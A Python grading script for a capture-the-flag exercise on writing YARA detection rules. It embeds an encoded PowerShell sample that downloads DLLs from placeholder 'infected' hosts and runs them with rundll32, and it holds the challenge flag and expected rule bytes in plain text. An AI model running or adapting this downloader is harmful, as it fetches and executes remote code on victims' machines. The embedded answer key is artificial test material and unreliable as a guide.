import sys
from pathlib import Path
import yara

flag = "flag{y@R4_C@N_d0_PAt7Ern_M47CHIn6}"
argc = len(sys.argv)
if argc < 2:
    print("Usage: ./check_yara <rulefile>")
    sys.exit()

rulefile = sys.argv[1]
if not Path(rulefile).exists():
    print("File not found")
    print("Usage: ./check_yara <rulefile>")
    sys.exit()

with open(rulefile, 'r') as f:
    ruleText = f.read()

try:
    rules = yara.compile(filepath=rulefile)
except yara.SyntaxError as e:
    print(str(e))
    sys.exit()
except:
    print("yara compile error")
    sys.exit()

data="""
powershell -enc JABzAHQAcgBzACAAPQAgACIAaAB0AHQAcABzADoALwAvAGkAbgBmAGUAYwB0AGUAZAAuAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwB3AG8AcgBkAHAAcgBlAHMAcwAvAGoAcAAyAGMATABsAHEANABYAHcAIgAsACAAIgBoAHQAdABwAHMAOgAvAC8AaQBuAGYAZQBjAHQAZQBkAC4AcQBnAHIAYwBpADcANABOAGcAVwAuAHgAeQB6AC8AMwBYAEcASgAwAHUAawBrAEIAVAAiACwAIAAiAGgAdAB0AHAAcwA6AC8ALwBpAG4AZgBlAGMAdABlAGQALgBnAG8AbwBvAG8AZwBsAGUALgBjAG8AbQAvAHMAaABvAHAALwBmAEQAdgBGAFAATABCAEIAZQBUACIADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAHMAdAAgAGkAbgAgACQAcwB0AHIAcwApAHsADQAKACAAIAAgACAAJAByADEAIAA9ACAAZwBlAHQALQByAGEAbgBkAG8AbQAgAA0ACgAgACAAIAAgACQAcgAyACAAPQAgAGcAZQB0AC0AcgBhAG4AZABvAG0ADQAKAA0ACgAgACAAIAAgACQAdABwAHQAaAAgAD0AIAAiAEMAOgBcAFwASQBuAGYAZQBjAHQAZQBkAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFwAIgAgACsAIAAkAHIAMQAgACsAIAAiAC4AZABsAGwAIgANAAoAIAAgACAAIABpAG4AZgBlAGMAdABlAGQALQBpAG4AdgBvAGsAZQAtAHcAZQBiAHIAZQBxAHUAZQBzAHQAIAAtAHUAcgBpACAAJABzAHQAIAAtAG8AdQB0AGYAaQBsAGUAIAAkAHQAcAB0AGgADQAKACAAIAAgACAAaQBmACAAKAB0AGUAcwB0AC0AcABhAHQAaAAgACQAdABwAHQAaAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAZgBwACAAPQAgACIAQwA6AFwAXABJAG4AZgBlAGMAdABlAGQALQBXAGkAbgBkAG8AdwBzAFwAXABTAHkAcwBXAG8AdwA2ADQAXABcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACIADQAKACAAIAAgACAAIAAgACAAIAAkAGEAIAA9ACAAJAB0AHAAdABoACAAKwAgACIALABmACIAIAArACAAJAByADIADQAKACAAIAAgACAAIAAgACAAIABzAHQAYQByAHQALQBwAHIAbwBjAGUAcwBzACAAIgBDADoAXABcAEkAbgBmAGUAYwB0AGUAZAAtAFcAaQBuAGQAbwB3AHMAXABcAFMAeQBzAFcAbwB3ADYANABcAFwAcgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIgAgAC0AYQByAGcAdQBtAGUAbgB0AGwAaQBzAHQAIAAkAGEADQAKACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsADQAKACAAIAAgACAAfQANAAoAfQANAAoAPAAjACAAWQBvAHUAcgAgAFAAQwAgAGkAcwAgAE0AaQBuAGUAIQAhACEAIQAhACEAIABDAHIAZQBhAHQAZQBkACAAYgB5ACAAWgBuAFYAdABNAFcAZwB4AGQARwA4AD0AIAAjAD4A
"""
matches_flag = rules.match(data = data)

if len(matches_flag) > 0:
    print('mathced rule:')
    print(matches_flag)
    print()
    if "base64" not in ruleText:
        print("Ops, It may detect another malware.\nThis malware seems to stupidly have the creator's name on it.")
        sys.exit()
    else:
        if "\\x5a\\x00\\x6e\\x00\\x56\\x00\\x74\\x00\\x4d\\x00\\x57\\x00\\x67\\x00\\x78\\x00\\x64\\x00\\x47\\x00\\x38\\x00\\x3d\\x00" not in ruleText:
            print("Good job!")
            print("But it may lead to false positives of other malware.\nTry again!!!")
            sys.exit()
        else:
            print('flag is ' + flag)
            print('Congratulations!')
else:
    print('No match')